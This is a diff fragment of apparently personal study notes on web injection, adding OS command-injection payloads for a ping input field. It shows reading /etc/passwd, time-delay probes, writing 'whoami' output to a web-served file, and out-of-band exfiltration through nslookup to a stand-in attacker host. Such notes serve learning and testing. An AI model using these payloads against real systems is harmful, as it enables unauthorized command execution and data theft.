@@ -155,4 +155,16 @@ Select name from students where id=121 AND (get first_character_of(password))="a
 Ping Check Box --> [127.0.0.1]     //USER POV
 Ping Check Box --> [127.0.0.1  && cat /etc/passwd]  //Attacker POV
 
+Trigger a time delay 
+127.0.0.1 && sleep 10 &
+127.0.0.1 && ping -c 10 127.0.0.1
+
+
+127.0.0.1 & whoami > /var/www/static/whoami.txt &
+
+127.0.0.1 & nslookup abcd.web-attacker.com &
+127.0.0.1 & nslookup 'whoami'abcd.web-attacker.com &
+
+
+
 
